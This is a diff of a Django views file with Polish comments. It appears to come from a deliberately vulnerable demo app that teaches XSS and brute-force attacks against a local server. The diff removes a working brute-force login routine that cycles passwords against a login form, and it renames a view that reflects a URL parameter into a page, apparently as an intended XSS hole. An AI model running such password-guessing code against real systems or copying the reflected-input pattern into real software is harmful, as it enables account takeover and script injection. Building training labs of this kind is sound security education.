@@ -9,49 +9,8 @@ from django.shortcuts import get_object_or_404
 from django.http import Http404
 import requests
 
-def brute_force_login(base_url, username, password_list):
-    """
-    Przykład symulacji ataku brute-force na aplikację webową.
-    Args:
-        base_url: URL aplikacji Django (np. "http://127.0.0.1:8000").
-        username: Nazwa użytkownika do zalogowania.
-        password_list: Lista haseł do przetestowania.
-    """
-    login_url = f"{base_url}/app"  # Strona logowania
-    session = requests.Session()  # Utworzenie sesji HTTP
 
-    for password in password_list:
-        # Przygotowanie danych POST
-        payload = {
-            'csrfmiddlewaretoken': session.get(login_url).cookies['csrftoken'],
-            'username': username,
-            'password': password,
-        }
-
-        # Wysłanie żądania POST
-        response = session.post(login_url, data=payload)
-
-        if response.url.endswith('/tasks'):  # Jeśli zalogowano poprawnie (przekierowanie)
-            print(f"Zalogowano poprawnie! Hasło to: {password}")
-            return password
-
-        print(f"Próba z hasłem '{password}' nieudana.")
-
-    print("Nie udało się znaleźć poprawnego hasła.")
-    return None
-
-
-def brute_force(request):
-    base_url = "http://127.0.0.1:8000"
-    username = "test123"
-    password_list = ["haslo1", "haslo12", "haslo123"]  # Lista haseł
-
-    password = brute_force_login(base_url, username, password_list)
-    print(password)
-    return redirect("app:index")
-
-
-def attack(request):
+def reflected_xss(request):
     """
     Widok obsługujący stronę /app/attack.
     Umożliwia wprowadzenie komunikatu i jego wyświetlenie.
@@ -61,7 +20,7 @@ def attack(request):
     if request.method == "GET" and 'msg' in request.GET:
         message = request.GET['msg']  # Pobieramy komunikat z parametrów URL
     
-    return render(request, 'app/attack.html', {'message': message})
+    return render(request, 'app/reflected_xss.html', {'message': message})
 
 
 def index(request):
@@ -113,8 +72,7 @@ def logout_view(request):
     return redirect("app:index")
 
 
-def reflected_xss(request):
-    pass
+
 
 @login_required
 def stored_xss(request):
@@ -156,7 +114,9 @@ def delete_comment(request, comment_id):
         return redirect("app:stored_xss")
 
 def dom_xss(request):
-    pass
+    return render(request, "app/dom_xss.html")
+
+
 
 def brute_force(request):
     return render(request, "app/brute_force.html")
